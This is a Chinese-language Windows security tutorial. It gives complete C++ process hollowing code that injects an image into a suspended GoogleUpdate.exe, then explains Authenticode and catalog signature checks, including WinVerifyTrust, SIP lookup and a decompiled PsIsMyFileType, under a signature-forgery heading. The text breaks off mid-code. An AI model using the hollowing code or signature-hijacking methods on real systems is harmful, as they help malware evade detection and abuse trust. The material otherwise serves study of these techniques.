<p>用CREATE_SUSPENDED标志能将任意程式执行并挂载为一个进程，且主线程是被暂停住的，尚未执行到执行程式装载器函数。此时暂停状态下进程的主线程的EIP指向线程共同路由函数<code>ntdll!RtlUserThreadStart</code>。该函数第一个参数放在EAX中，储存线程完成必要初始化后应返回哪里继续执行的位址，第二个参数放在EBX中，储存内核生成的该进程中PEB块位址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span> (disable : 4996)</span></span><br><span class="line"><span class="function">BYTE* <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">    FILE* fileptr;</span><br><span class="line">    BYTE* buffer;</span><br><span class="line">    fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// Open the file in binary mode</span></span><br><span class="line">    <span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);          <span class="comment">// Jump to the end of the file</span></span><br><span class="line">    filelen = <span class="built_in">ftell</span>(fileptr);             <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">    <span class="built_in">rewind</span>(fileptr);                      <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">    buffer = (BYTE*)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr); <span class="comment">// Read in the entire file</span></span><br><span class="line">    <span class="built_in">fclose</span>(fileptr); <span class="comment">// Close the file</span></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunPortableExecutable</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">void</span>* Image)</span> </span>&#123;</span><br><span class="line">    PROCESS_INFORMATION PI = &#123;&#125;;</span><br><span class="line">    STARTUPINFOA SI = &#123;&#125;;</span><br><span class="line">    CONTEXT* CTX;</span><br><span class="line">    <span class="type">void</span>* pImageBase; <span class="comment">// Pointer to the image base</span></span><br><span class="line">    IMAGE_NT_HEADERS* NtHeader = <span class="built_in">PIMAGE_NT_HEADERS</span>((<span class="type">size_t</span>)Image + <span class="built_in">PIMAGE_DOS_HEADER</span>(Image)-&gt;e_lfanew);</span><br><span class="line">    IMAGE_SECTION_HEADER* SectionHeader = <span class="built_in">PIMAGE_SECTION_HEADER</span>((<span class="type">size_t</span>)NtHeader + <span class="built_in">sizeof</span>(*NtHeader));</span><br><span class="line">    <span class="comment">// Create a new instance of current process in suspended state, for the new image.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CreateProcessA</span>(path, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>, CREATE_SUSPENDED, <span class="number">0</span>, <span class="number">0</span>, &amp;SI, &amp;PI)) &#123;</span><br><span class="line">        <span class="comment">// Allocate memory for the context.</span></span><br><span class="line">        CTX = <span class="built_in">LPCONTEXT</span>(<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">        CTX-&gt;ContextFlags = CONTEXT_FULL; <span class="comment">// Context is allocated</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX))) &#123;<span class="comment">//if context is in thread</span></span><br><span class="line">            pImageBase = <span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="built_in">LPVOID</span>(NtHeader-&gt;OptionalHeader.ImageBase), NtHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            <span class="comment">// File Mapping</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">                <span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>((<span class="type">size_t</span>)pImageBase + SectionHeader[i].VirtualAddress), <span class="built_in">LPVOID</span>((<span class="type">size_t</span>)Image + SectionHeader[i].PointerToRawData), SectionHeader[i].SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(PI.hProcess, <span class="built_in">LPVOID</span>(CTX-&gt;Ebx + <span class="number">8</span>), <span class="built_in">LPVOID</span>(&amp;pImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">            CTX-&gt;Eax = <span class="built_in">DWORD</span>(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX));</span><br><span class="line">            <span class="built_in">ResumeThread</span>(PI.hThread);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> CALLBACK <span class="title">WinMain</span><span class="params">(HINSTANCE, HINSTANCE, LPSTR, <span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> CurrentFilePath[MAX_PATH + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="number">0</span>, CurrentFilePath, MAX_PATH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(CurrentFilePath, <span class="string">&quot;GoogleUpdate.exe&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;We Cool?&quot;</span>, <span class="string">&quot;30cm.tw&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    LONGLONG len = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">RunPortableExecutable</span>(<span class="string">&quot;GoogleUpdate.exe&quot;</span>, <span class="built_in">MapFileToMemory</span>(CurrentFilePath, len));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="数位签名"><a href="#数位签名" class="headerlink" title="数位签名"></a>数位签名</h2><h3 id="签名伪造"><a href="#签名伪造" class="headerlink" title="签名伪造"></a>签名伪造</h3><p>数位签名的签署方式有两种：第一种，也是主流商业产品上采用的方式，就是嵌入式数位签名，其将验证用的签署咨询直接绑定在PE结构末端，方便程式档案再携带、复制或者发布同时一并将该程式签署咨询转移到洽谈电脑上进行验证。第二种，为分离式数位签名，将程式的指纹记录&#x2F;杂凑资讯储存于作业系统C:\Windows\System32\CatRoot中。</p>
<p>对于第二种，每个副档名为.cat的档案为按照ASN.1标准封装的记录，储存了档案文件名称与其对应的档案内容杂凑。该资料夹只有高权系统服务或提供UAC许可“权限提升Process”才能写入.cat指纹档案。</p>
<p>验证一个程式档案是否收到签署，且数位签章有效性：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _UNICODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNICODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Softpub.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wintrust.h&gt;</span></span></span><br><span class="line"><span class="comment">// Link with the Wintrust.lib file.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;wintrust&quot;</span>)</span></span><br><span class="line"><span class="function">BOOL <span class="title">VerifyEmbeddedSignature</span><span class="params">(LPCWSTR pwszSourceFile)</span> </span>&#123;</span><br><span class="line">    LONG lStatus;</span><br><span class="line">    DWORD dwLastError;</span><br><span class="line">    <span class="comment">// Initialize the WINTRUST_FILE_INFO structure.</span></span><br><span class="line">    WINTRUST_FILE_INFO FileData; <span class="comment">//用于指名要受验证的程式档案在磁碟槽上的路径</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;FileData, <span class="number">0</span>, <span class="built_in">sizeof</span>(FileData));</span><br><span class="line">    FileData.cbStruct = <span class="built_in">sizeof</span>(WINTRUST_FILE_INFO);</span><br><span class="line">    FileData.pcwszFilePath = pwszSourceFile; <span class="comment">//指向受验证档案之路径</span></span><br><span class="line">    FileData.hFile = <span class="literal">NULL</span>;</span><br><span class="line">    FileData.pgKnownSubject = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    WVTPolicyGUID specifies the policy to apply on the file</span></span><br><span class="line"><span class="comment">    WINTRUST_ACTION_GENERIC_VERIFY_V2 policy checks:</span></span><br><span class="line"><span class="comment">    1) The certificate used to sign the file chains up to a root certificate located in the trusted root certificate store. This implies that the identity of the publisher has been verified by a certification authority.</span></span><br><span class="line"><span class="comment">    2) In cases where user interface is displayed (which this example does not do), WinVerifyTrust will check for whether the end entity certificate is stored in the trusted publisher store, implying that the user trusts content from this publisher.</span></span><br><span class="line"><span class="comment">    3) The end entity certificate has sufficient permission to sign code, as indicated by the presence of a code signing EKU or no EKU.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;</span><br><span class="line">    WINTRUST_DATA WinTrustData;</span><br><span class="line">    <span class="comment">// Initialize the WinVerifyTrust input data structure.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;WinTrustData, <span class="number">0</span>, <span class="built_in">sizeof</span>(WinTrustData));       <span class="comment">// Default all fields to 0.</span></span><br><span class="line">    WinTrustData.cbStruct = <span class="built_in">sizeof</span>(WinTrustData);</span><br><span class="line">    WinTrustData.pPolicyCallbackData = <span class="literal">NULL</span>;              <span class="comment">// Use default code signing EKU.</span></span><br><span class="line">    WinTrustData.pSIPClientData = <span class="literal">NULL</span>;                   <span class="comment">// No data to pass to SIP.</span></span><br><span class="line">    WinTrustData.dwUIChoice = WTD_UI_NONE;                <span class="comment">// Disable WVT UI.</span></span><br><span class="line">    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;   <span class="comment">// No revocation checking.</span></span><br><span class="line">    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;         <span class="comment">// Verify an embedded signature on a file.</span></span><br><span class="line">    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;  <span class="comment">// Verify action.</span></span><br><span class="line">    WinTrustData.hWVTStateData = <span class="literal">NULL</span>;                    <span class="comment">// Verification sets this value.</span></span><br><span class="line">    WinTrustData.pwszURLReference = <span class="literal">NULL</span>;                 <span class="comment">// Not used.</span></span><br><span class="line">    WinTrustData.dwUIContext = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Set pFile.</span></span><br><span class="line">    WinTrustData.pFile = &amp;FileData;</span><br><span class="line">    <span class="comment">// WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.</span></span><br><span class="line">    lStatus = <span class="built_in">WinVerifyTrust</span>(<span class="literal">NULL</span>, &amp;WVTPolicyGUID, &amp;WinTrustData);</span><br><span class="line">    <span class="keyword">switch</span> (lStatus) &#123;</span><br><span class="line">        <span class="keyword">case</span> ERROR_SUCCESS:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Signed file:</span></span><br><span class="line"><span class="comment">                - Hash that represents the subject is trusted.</span></span><br><span class="line"><span class="comment">                - Trusted publisher without any verification errors.</span></span><br><span class="line"><span class="comment">                - UI was disabled in dwUIChoice. No publisher or time stamp chain errors.</span></span><br><span class="line"><span class="comment">                - UI was enabled in dwUIChoice and the user clicked &quot;Yes&quot; when asked to install and run the signed subject.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The file \&quot;%s\&quot; is signed and the signature was verified.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_NOSIGNATURE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The file was not signed or had a signature that was not valid.</span></span><br><span class="line">            <span class="comment">// Get the reason for no signature.</span></span><br><span class="line">            dwLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">            <span class="keyword">if</span> (TRUST_E_NOSIGNATURE == dwLastError || TRUST_E_SUBJECT_FORM_UNKNOWN == dwLastError || TRUST_E_PROVIDER_UNKNOWN == dwLastError)</span><br><span class="line">                <span class="comment">// The file was not signed.</span></span><br><span class="line">                <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The file \&quot;%s\&quot; is not signed.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// The signature was not valid or there was an error opening the file.</span></span><br><span class="line">                <span class="built_in">wprintf_s</span>(<span class="string">L&quot;An unknown error occurred trying to verify the signature of the \&quot;%s\&quot; file.\n&quot;</span>, pwszSourceFile);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_EXPLICIT_DISTRUST:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The hash that represents the subject or the publisher is not allowed by the admin or user.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The signature is present, but specifically disallowed.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> TRUST_E_SUBJECT_NOT_TRUSTED:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The user clicked &quot;No&quot; when asked to install and run.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;The signature is present, but not trusted.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">case</span> CRYPT_E_SECURITY_SETTINGS:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The hash that represents the subject or the publisher was not explicitly trusted by the admin and the admin policy has disabled user trust. No signature, publisher or time stamp errors.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;CRYPT_E_SECURITY_SETTINGS - The hash representing the subject or the publisher wasn&#x27;t explicitly trusted by the admin and admin policy has disabled user trust. No signature, publisher or timestamp errors.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The UI was disabled in dwUIChoice or the admin policy has disabled user trust. lStatus contains the publisher or time stamp chain error.</span></span><br><span class="line">            <span class="built_in">wprintf_s</span>(<span class="string">L&quot;Error is: 0x%x.\n&quot;</span>, lStatus);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// Any hWVTStateData must be released by a call with close.</span></span><br><span class="line">    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;</span><br><span class="line">    lStatus = <span class="built_in">WinVerifyTrust</span>(<span class="literal">NULL</span>, &amp;WVTPolicyGUID, &amp;WinTrustData);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">VerifyEmbeddedSignature</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在第29行处，<code>WINTRUST_ACTION_GENERIC_VERIFY_V2</code>指示当前要验证的档案是受Authenticode规格签署的数位签名后档案，该值代表是一串Windows COM Interface代号，使<code>WinVerifyTrust</code>透过不同GUID来选用不同COM Interface的DLL模组之导出函数进行验证是否有效。其他选项有HTTPSPROV_ACTION，被用在IE浏览器验证当前SSL&#x2F;TLS之HTTPS网路连线之对方数位签章是否有效，DRIVER_ACTION_VERIFY验证是否为有效Windows Hardware Quality Labs(WHQL)驱动档案。</p>
<p><code>WinVerifyTrust</code>返回值有：</p>
<table>
<thead>
<tr>
<th>结果</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ERROR_SUCCESS</td>
<td>传入档案确实受到签名验证通过，且档案无损毁或遭篡改之疑虑。</td>
</tr>
<tr>
<td>TRUST_E_NOSIGNATURE</td>
<td>传入档案之签名内容不存在或具有无效数位签章。</td>
</tr>
<tr>
<td>TRUST_E_EXPLICIT_DISTRUST</td>
<td>传入档案具有有效签名且验证通过，但该签名效力被签署人或当前用户禁用从而无效。</td>
</tr>
<tr>
<td>TRUST_E_SUBJECT_NOT_TRUSTED</td>
<td>该安装该签名之证书到本地系统时被用户手动阻止导致此签名不被信任。</td>
</tr>
<tr>
<td>CRYPT_E_SECURITY_SETTINGS</td>
<td>该签名证书当前被网管设下的群组原则禁用，指纹计算结果不吻合当前传入档案，时间戳记异常等。</td>
</tr>
</tbody></table>
<p><code>WinVerifyTrust</code>具体细节看<a target="_blank" rel="noopener" href="https://specterops.io/wp-content/uploads/sites/3/2022/06/SpecterOps_Subverting_Trust_in_Windows.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/SpecterOps_Subverting_Trust_in_Windows.pdf</a> 。在Windows 10时代的详解请看<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458286402&idx=3&sn=6eac85d87908e1ee132b09e852c17682&chksm=b18149c886f6c0de5efeb852f59c670353c5331f4fbbafccddd809a53e0d0d11c5bb237ac5f1&scene=27">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286402&amp;idx=3&amp;sn=6eac85d87908e1ee132b09e852c17682&amp;chksm=b18149c886f6c0de5efeb852f59c670353c5331f4fbbafccddd809a53e0d0d11c5bb237ac5f1&amp;scene=27</a> 。数字签名劫持实战请看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/31083135">https://zhuanlan.zhihu.com/p/31083135</a> 。</p>
<p>由于不同种类档案其数位签名储存方式皆不同，因此微软体系下将每不同中档案验证方式都独立涉及一个COM Interface，即全局共享DLL模组，作为对应当前档案种类的Subject Interface Package(SIP)接口，并配有一组GUID能够反查SIP模组来使用。大致流程如下，“*”表示可选过程：</p>
<table>
<thead>
<tr>
<th>顺序</th>
<th>Trust Provider</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Initialization</td>
</tr>
<tr>
<td>2</td>
<td>Message</td>
</tr>
<tr>
<td>3</td>
<td>Signature</td>
</tr>
<tr>
<td>4</td>
<td>Certificate</td>
</tr>
<tr>
<td>5</td>
<td>CertCheck*</td>
</tr>
<tr>
<td>6</td>
<td>FinalPolicy</td>
</tr>
<tr>
<td>7</td>
<td>DiagnosticPolicy*</td>
</tr>
<tr>
<td>8</td>
<td>Cleanup*</td>
</tr>
</tbody></table>
<p>在上述Message阶段时，先后呼叫三个函数：</p>
<ol>
<li>在<code>Crypt32!CryptSIPDllsMyFileType</code>中将按顺序确认当前传入档案是PE、Catalog、CTL、Cabinet哪种类型并返回对应SIP接口GUID序号。倘若非上述4中，将从注册表中用<code>PsIsMyFileType</code>确认是否为PowerShell脚本、Windows MSI安装包、WIndows应用商店Appx程式等并返回对应SIP接口GUID序号。</li>
<li>在上个步骤提取出对应当前档案SIP的GUID后，用<code>Crypt32!CryptSIPGetSignedDataMsg</code>以对应SIP接口从当前档案提取签名资讯。</li>
<li>用<code>Crypt32!CryptSIPVerifyIndirectData</code>计算当前档案杂凑结果作为指纹，与上个步骤提取出的签名资讯比对，若杂凑结果一致则当前档案与签名当下的档案内容是完全一致的，若不一样则代表该档案在传输或复制过程中损毁或被植入后门、篡改后的档案。</li>
</ol>
<p>当然上述为设计理论，实践证明<code>PsIsMyFileType</code>的实现在C:\Windows\System32\WindowsPowerShell\v1.0\pwrshsip.dll，代码如下。<code>CryptSIPDllsMyFileType</code>并没有实现，而是查找注册表，并直接调用<code>pwrshsip!PsIsMyFileType</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">PsIsMyFileType</span><span class="params">(<span class="type">unsigned</span> __int16* a1, <span class="keyword">struct</span> _GUID* a2)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">wchar_t</span>* v4; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">    <span class="type">wchar_t</span>* String2[<span class="number">7</span>]; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a2 &amp;&amp; (*a2 = <span class="number">0LL</span>, a1)) &#123;</span><br><span class="line">        v4 = <span class="built_in">wcsrchr</span>(a1, <span class="number">0x2E</span>u);</span><br><span class="line">        <span class="keyword">if</span> (v4) &#123;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">            String2[<span class="number">0</span>] = <span class="string">L&quot;ps1&quot;</span>;</span><br><span class="line">            String2[<span class="number">1</span>] = <span class="string">L&quot;ps1xml&quot;</span>;</span><br><span class="line">            String2[<span class="number">2</span>] = <span class="string">L&quot;psc1&quot;</span>;</span><br><span class="line">            String2[<span class="number">3</span>] = <span class="string">L&quot;psd1&quot;</span>;</span><br><span class="line">            String2[<span class="number">4</span>] = <span class="string">L&quot;psm1&quot;</span>;</span><br><span class="line">            String2[<span class="number">5</span>] = <span class="string">L&quot;cdxml&quot;</span>;</span><br><span class="line">            String2[<span class="number">6</span>] = <span class="string">L&quot;mof&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (_wcsicmp(v4 + <span class="number">1</span>, String2[v5])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++v5 &gt;= <span class="number">7</span>)</span><br><span class="line">                    <span class="keyword">return</span> v2;</span><br><span class="line">            &#125;</span><br><span class="line">            *a2 = guidPsSip;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">SetLastError</span>(<span class="number">0x57</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>稍微整理一下可得：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CRYPT_SUBJTYPE_POWERSHELL_IMAGE &#123;0x603BCC1F,0x4B59,0x4E08,&#123;0xB7,0x24,0xD2,0xC6,0x29,0x7E,0xF3,0x51&#125;&#125;</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">PsIsMyFileType</span><span class="params">(IN WCHAR* pwszFileName, OUT GUID* pgSubject)</span> </span>&#123;</span><br><span class="line">    BOOL bResult;</span><br><span class="line">    WCHAR* SupportedExtensions[<span class="number">7</span>];</span><br><span class="line">    WCHAR* Extension;</span><br><span class="line">    GUID 